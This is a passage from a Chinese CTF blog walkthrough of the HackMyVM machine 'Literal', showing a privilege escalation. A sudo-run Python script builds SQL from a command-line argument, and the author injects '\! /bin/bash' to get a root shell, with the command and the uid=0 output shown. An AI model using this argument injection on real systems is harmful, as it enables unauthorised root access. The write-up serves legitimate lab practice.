+        query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>
+    else:
+        query_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Variables ------------------------------------------------.</span>
+db_user <span class="token operator">=</span> <span class="token string">"carlos"</span>
+db_name <span class="token operator">=</span> <span class="token string">"blog"</span>
+
+<span class="token comment"># Main program</span>
+main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>注意到</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">try:
+       arg_project_id <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+   except:
+       arg_project_id <span class="token operator">=</span> <span class="token string">""</span>
+
+   try:
+       arg_project_status <span class="token operator">=</span> sys.argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+   except:
+       arg_project_status <span class="token operator">=</span> <span class="token string">""</span></code></pre>
+<p>脚本会接受两个参数，第一个参数会在下面地方执行，也就是会在sql里面执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">def query_by_id<span class="token punctuation">(</span>arg_project_id<span class="token punctuation">)</span>:
+    sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM projects WHERE proid = "</span> + arg_project_id + <span class="token string">";"</span>
+    execute_query<span class="token punctuation">(</span>sql<span class="token punctuation">)</span></code></pre>
+<p>第二个参数是个状态<code>[&quot;Done&quot;, &quot;Doing&quot;, &quot;To do&quot;]</code><br>那么就可以注入一个命令拿到root的shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">SELECT * FROM projects WHERE proid <span class="token operator">=</span> <span class="token string">"\! /bin/bash"</span><span class="token punctuation">;</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">sudo</span> /opt/my_things/blog/update_project_status.py <span class="token string">'\! /bin/bash'</span> Done
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Before update project <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token operator">!</span> /bin/bash<span class="token punctuation">)</span>
+
+root@literal:/home/carlos<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>舒服了，复习去了。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/42ff075e/" title="HackMyVM-Literal">https://tao0845.github.io/posts/42ff075e/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/f5427d41/" rel="prev" title="HackMyVM-hundred"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-hundred</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/6b328076/" rel="next" title="HackMyVM-eyes"><span class="post-nav-text">HackMyVM-eyes</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
